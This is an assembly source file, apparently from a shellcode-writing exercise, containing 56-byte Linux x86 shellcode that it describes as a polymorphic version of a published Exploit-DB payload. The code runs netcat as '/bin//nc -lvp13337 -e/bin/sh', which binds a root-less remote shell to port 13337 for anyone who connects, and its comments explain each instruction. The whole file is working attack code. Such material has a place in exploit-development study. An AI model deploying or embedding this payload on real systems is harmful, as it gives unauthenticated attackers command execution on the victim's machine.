; Filename: bind-netcat-shell.nasm
; Author:  Juanma Reyes
; Website:  jmreyes.net
;
; Linux x86 Bind Netcat Shell shellcode (56 bytes) 
; Polymorphic version of https://www.exploit-db.com/exploits/39901/

global _start			

section .text
_start:
	push 0xb	; Select execve() syscall
	pop eax
	cdq		; Alternative way to zero-out EDX
	push edx
	push 0x636e2f2f ; '//nc'
	push 0x6e69622f ; '/bin'
	mov ebx, esp	; EBX points to '/bin//nc'
	push edx
	push word 0x6873 ; 'sh' -> Saving 1 byte by using push word! 
	push 0x2f6e6962 ; 'bin/'
	push 0x2f656c2d ; '-le/'
	mov esi, esp
	push edx
	push 0x37333333 ; '3337'
	push 0x3170762d ; '-vp1'
	mov edi, esp
	push edx
	push edi
	push esi
	push ebx	; ESP now points to argument array
	mov ecx, esp	; Now EAX, EBX and ECX are set for the execve() syscall
	int 0x80
